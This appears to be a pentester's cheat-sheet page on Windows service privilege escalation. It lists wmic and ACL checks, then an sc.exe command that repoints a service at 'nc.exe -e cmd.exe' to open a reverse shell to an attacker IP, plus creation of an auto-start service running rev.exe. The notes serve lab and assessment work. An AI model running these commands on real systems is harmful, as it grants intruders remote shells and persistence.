---
title: "Windows Services"
date: 2024-7-13
tags: ["Server Operators", "Active Directory", "Windows", "Privilege Escalation", "Services", "Reverse Shell", "Unquoted Service Path"]
---

### Check unquoted service path

```console
cmd.exe /c 'wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """'
```

```console {class="sample-code"}
PS C:\Users\user1> cmd.exe /c 'wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """'
WC Assistant    WCAssistantService    C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe    Auto 
```

### Check service ACLs

```console
. .\Get-ServiceAcl
```

```console
"<SERVICE>" | Get-ServiceAcl | Select -ExpandProperty Access
```

```console {class="sample-code"}
PS > "SomeService" | Get-ServiceAcl | select -ExpandProperty Access

...[SNIP]...

ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl
AccessControlType : AccessAllowed
IdentityReference : COMPUTER-MS01\user
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

...[SNIP]...
```

<small>*Ref: [Get-ServiceAcl.ps1](https://raw.githubusercontent.com/Sambal0x/tools/refs/heads/master/Get-ServiceAcl.ps1)*</small>

### Abuse #1: Change service path

#### 1. Change service path

```console
# Assume nc.exe is uploaded
sc.exe config <SERVICE> binPath= "C:\ProgramData\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>"
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\windows\tasks> sc.exe config VSS binpath="C:\windows\tasks\nc.exe -e cmd 10.10.14.44 443"
[SC] ChangeServiceConfig SUCCESS
```

#### 2. Restart service

```console
# Stop service
sc.exe stop <SERVICE>
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\windows\tasks> sc.exe stop VSS
[SC] ControlService FAILED 1062:

The service has not been started.
```

```console
# Start service
sc.exe start <SERVICE>
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\windows\tasks> sc.exe start VSS
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

### Additional: Create service

```console
# Create a service
sc.exe create <NEW_SERVICE> binpath= C:\ProgramData\rev.exe start= auto
```

<small>*Note: there is a space after named arguments*</small>